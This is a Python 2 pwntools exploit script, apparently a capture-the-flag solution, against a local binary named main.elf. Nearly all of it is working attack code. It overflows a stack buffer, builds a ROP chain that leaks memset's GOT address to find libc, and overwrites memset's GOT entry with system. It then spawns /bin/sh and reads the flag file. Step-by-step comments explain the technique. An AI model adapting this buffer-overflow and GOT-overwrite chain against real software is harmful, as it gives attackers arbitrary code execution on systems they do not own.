#!/usr/bin/env python2

from pwn import *
from struct import *

binary = "./main.elf"
velf = ELF(binary) 


libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#from gdb
#(gdb) disass echo, see the plt address for each function, disass it, then see the GOT address
writePlt = 0x400590
readPlt =  0x4005e0
setbufPlt = 0x4005b0
memsetPlt = 0x4005d0
memsetGot = 0x601038
setbufGot = 0x601028	

#x/6i hint
   #0x4007a8 <hint>:	push   rbp
   #0x4007a9 <hint+1>:	mov    rbp,rsp
   #0x4007ac <hint+4>:	pop    rdi
   #0x4007ad <hint+5>:	pop    rsi
   #0x4007ae <hint+6>:	pop    rdx
   #0x4007af <hint+7>:	ret
pop3ret = 0x4007ac

#ldd main.elf 
	#linux-vdso.so.1 =>  (0x00007ffe0b79e000)
	#libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdfc40d0000)
	#/lib64/ld-linux-x86-64.so.2 (0x0000557f0fb9f000)

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep memset
    #67: 00000000000ac8b0   114 FUNC    WEAK   DEFAULT   13 wmemset@@GLIBC_2.2.5
   #779: 0000000000117bf0    25 FUNC    GLOBAL DEFAULT   13 __wmemset_chk@@GLIBC_2.4
   #846: 000000000008f1b0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5
  #1397: 0000000000116330    65 IFUNC   GLOBAL DEFAULT   13 __memset_chk@@GLIBC_2.3.4

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system                                                                              
   #225: 00000000001387d0    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   #584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  #1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
memsetOffset = 0x8f1b0 
systemOffset = 0x45390

p = process(binary)


#first the write function is called, which will write 8B from memsetGot(which is already called once, so the real address of
#memset is in the GOT table) on the standard output
exploit = ""

exploit += "A"*168 + p64(pop3ret) + p64(0x1) + p64(memsetGot) + p64(0x8) + p64(writePlt) 

#then we will read from standard input to the memsetGot, and the input we will provide will be the address of system
#so next time memset is called, actually the system will be executed
exploit += p64(pop3ret) + p64(0x0) + p64(memsetGot) + p64(0x8) + p64(readPlt) 

#in setbufGOT we will write the address of the string "/bin/sh"
exploit += p64(pop3ret) + p64(0x0) + p64(setbufGot) + p64(0x8) + p64(readPlt)

#finally we will call memset, which now calles syscall, with the address of the string "/bin/sh" into rdi(the other 2 registers from
#the gadget are not important) 
exploit += p64(pop3ret) + p64(setbufGot) + p64(setbufGot) + p64(setbufGot) + p64(memsetPlt)

"""
print("Libc")
with open("/proc/{}/maps".format(proc.pidof(p)[0])) as f:
    for l in f.readlines():
        if "libc" in l:
            log.info(l)
            break
"""

#log.info(p.recvuntil(":"))

p.sendline(exploit)

log.info(p.recvuntil(":P"))

val = p.recv(8)


memsetAddr = u64(val)
log.info("the address of memset is " + hex(memsetAddr))

libcAddr = memsetAddr - memsetOffset - 0x90
log.info("the base address of libc is " + hex(libcAddr)) 

systemAddr = libcAddr + systemOffset
log.info("the  address of system is " + hex(systemAddr)) 


p.send(p64(systemAddr) + "/bin/sh\n")

p.sendline("cat flag.txt")

p.interactive()



